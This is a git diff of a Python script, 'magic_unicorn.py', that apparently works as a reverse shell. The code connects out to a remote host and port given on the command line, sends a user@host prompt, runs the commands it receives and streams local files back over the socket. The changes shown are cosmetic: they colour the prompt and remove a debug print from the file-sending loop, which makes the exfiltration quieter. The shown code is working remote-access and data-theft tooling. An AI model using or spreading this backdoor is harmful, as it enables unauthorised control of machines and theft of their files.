@@ -15,6 +15,9 @@ W = '\033[1;33m[!] \033[0m'
 E = '\033[1;31m[-] \033[0m'
 G = '\033[1;34m[*] \033[0m'
 
+GREEN = '\033[0;33m'
+RESET = '\033[0m'
+
 if len(sys.argv) < 3:
     print("Usage: magic_unicorn.py <remote_host> <remote_port>")
     sys.exit()
@@ -27,7 +30,7 @@ sock.connect((RHOST, RPORT))
 
 while True:
     try:
-        header = f"""({getpass.getuser()}@{platform.node()})> """
+        header = f"""({GREEN}{getpass.getuser()}@{platform.node()}{RESET})> """
         sock.send(header.encode())
         STDOUT, STDERR = None, None
         cmd = sock.recv(1024).decode("utf-8")
@@ -57,7 +60,6 @@ Processor Architecture: {platform.processor()}
             with open(cmd.split(" ")[1], "rb") as f:
                 file_data = f.read(1024)
                 while file_data:
-                    print("Sending", file_data)
                     sock.send(file_data)
                     file_data = f.read(1024)
                 sleep(2)
